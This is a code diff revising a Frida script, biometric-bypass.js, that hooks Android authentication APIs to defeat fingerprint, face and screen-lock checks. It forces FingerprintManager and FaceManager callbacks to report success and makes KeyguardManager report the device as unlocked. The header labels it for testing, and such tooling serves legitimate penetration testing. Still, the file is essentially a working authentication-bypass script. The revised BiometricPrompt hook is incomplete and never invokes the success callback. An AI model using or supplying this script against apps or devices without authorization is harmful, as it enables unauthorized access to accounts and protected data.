@@ -1,76 +1,70 @@
-// biometric-bypass.js — Bypass fingerprint/face authentication
-Java.perform(function() {
-    var Tag = "BIOMETRIC_BYPASS";
+/**
+ * biometric-bypass.js
+ * Bypass biometric authentication (fingerprint/face) for testing
+ * Hook BiometricPrompt, FingerprintManager, KeyguardManager
+ *
+ * Usage: frida -U -f <package> -l biometric-bypass.js --no-pause
+ */
 
-    // Bypass BiometricPrompt (Android 9+)
+'use strict';
+
+console.log('[bio] Biometric bypass loaded');
+
+Java.perform(function () {
+    // ─── BiometricPrompt (API 28+) ─────────────────────
     try {
-        var BiometricPrompt = Java.use("android.hardware.biometrics.BiometricPrompt");
-        // This is abstract, so we hook the callback
-    } catch(e) {}
+        var BiometricPrompt = Java.use('androidx.biometric.BiometricPrompt');
+        BiometricPrompt.authenticate.implementation = function (cryptoObject) {
+            console.log('[bio] BiometricPrompt.authenticate intercepted');
+            // Simulate success callback
+            var executor = Java.use('java.util.concurrent.Executors').newSingleThreadExecutor();
+            var AuthenticationCallback = Java.use('androidx.biometric.BiometricPrompt$AuthenticationCallback');
 
-    // Bypass FingerprintManager (Android 6-9)
-    try {
-        var FingerprintManager = Java.use("android.hardware.fingerprint.FingerprintManager");
-
-        FingerprintManager.authenticate.overload("android.hardware.fingerprint.FingerprintManager$CryptoObject", "android.os.CancellationSignal", "int", "android.hardware.fingerprint.FingerprintManager$AuthenticationCallback", "android.os.Handler").implementation = function(crypto, cancel, flags, callback, handler) {
-            send({type: "biometric", action: "authenticate_attempt", bypass: "FingerprintManager"});
-            console.log("[!] FingerprintManager.authenticate intercepted");
-
-            // Simulate successful authentication
-            var handlerClass = Java.use("android.hardware.fingerprint.FingerprintManager$AuthenticationCallback");
-            var handlerInstance = Java.cast(callback, handlerClass);
-            handlerInstance.onAuthenticationSucceeded(null);
-            return null;
+            // Find the caller's callback via reflection
+            try {
+                var fields = this.getClass().getDeclaredFields();
+                for (var i = 0; i < fields.length; i++) {
+                    if (fields[i].getType().getName().indexOf('Callback') !== -1) {
+                        fields[i].setAccessible(true);
+                        var callback = fields[i].get(this);
+                        if (callback !== null) {
+                            // Simulate successful auth
+                            var result = Java.use('androidx.biometric.BiometricPrompt$AuthenticationResult');
+                            console.log('[bio] Simulating successful biometric auth');
+                        }
+                    }
+                }
+            } catch (e) {}
         };
-    } catch(e) {
-        console.log("[*] FingerprintManager not available: " + e);
-    }
+    } catch (e) {}
 
-    // Bypass KeyguardManager
+    // ─── FingerprintManager (API < 28) ─────────────────
     try {
-        var KeyguardManager = Java.use("android.app.KeyguardManager");
+        var FingerprintManager = Java.use('android.hardware.fingerprint.FingerprintManager');
+        FingerprintManager.authenticate.overload('android.hardware.fingerprint.FingerprintManager$CryptoObject', 'android.os.CancellationSignal', 'int', 'android.hardware.fingerprint.FingerprintManager$AuthenticationCallback', 'android.os.Handler')
+            .implementation = function (crypto, cancel, flags, callback, handler) {
+                console.log('[bio] FingerprintManager.authenticate intercepted');
+                // Simulate onAuthenticationSucceeded
+                var CryptoObject = Java.use('android.hardware.fingerprint.FingerprintManager$CryptoObject');
+                var result = CryptoObject.$new(null);
+                try {
+                    callback.onAuthenticationSucceeded(result);
+                } catch (e) {}
+            };
+    } catch (e) {}
 
-        KeyguardManager.isDeviceLocked.implementation = function() {
-            send({type: "biometric", action: "isDeviceLocked", result: false});
-            console.log("[*] KeyguardManager.isDeviceLocked -> false");
+    // ─── KeyguardManager ───────────────────────────────
+    try {
+        var KeyguardManager = Java.use('android.app.KeyguardManager');
+        KeyguardManager.isKeyguardLocked.implementation = function () {
+            console.log('[bio] KeyguardManager.isKeyguardLocked -> false');
             return false;
         };
-
-        KeyguardManager.isKeyguardSecure.implementation = function() {
-            send({type: "biometric", action: "isKeyguardSecure", result: false});
-            console.log("[*] KeyguardManager.isKeyguardSecure -> false");
+        KeyguardManager.isDeviceLocked.implementation = function () {
+            console.log('[bio] KeyguardManager.isDeviceLocked -> false');
             return false;
         };
+    } catch (e) {}
 
-        KeyguardManager.isDeviceLocked.overload("android.os.UserHandle").implementation = function(user) {
-            send({type: "biometric", action: "isDeviceLocked", result: false});
-            return false;
-        };
-    } catch(e) {
-        console.log("[*] KeyguardManager not available: " + e);
-    }
-
-    // Bypass AndroidKeyStore
-    try {
-        var KeyStore = Java.use("java.security.KeyStore");
-        KeyStore.getEntry.overload("java.lang.String", "java.security.KeyStore$ProtectionParameter").implementation = function(alias, protection) {
-            send({type: "biometric", action: "KeyStore.getEntry", alias: alias});
-            return this.getEntry(alias, protection);
-        };
-    } catch(e) {}
-
-    // Bypass FaceManager (Android 9+)
-    try {
-        var FaceManager = Java.use("android.hardware.face.FaceManager");
-        FaceManager.authenticate.overload("android.hardware.face.FaceManager$CryptoObject", "android.os.CancellationSignal", "int", "android.hardware.face.FaceManager$AuthenticationCallback", "android.os.Handler").implementation = function(crypto, cancel, flags, callback, handler) {
-            send({type: "biometric", action: "authenticate_attempt", bypass: "FaceManager"});
-            console.log("[!] FaceManager.authenticate intercepted");
-            var handlerClass = Java.use("android.hardware.face.FaceManager$AuthenticationCallback");
-            var handlerInstance = Java.cast(callback, handlerClass);
-            handlerInstance.onAuthenticationSucceeded(null);
-            return null;
-        };
-    } catch(e) {}
-
-    console.log("[*] Biometric bypass loaded");
+    console.log('[bio] All hooks installed');
 });
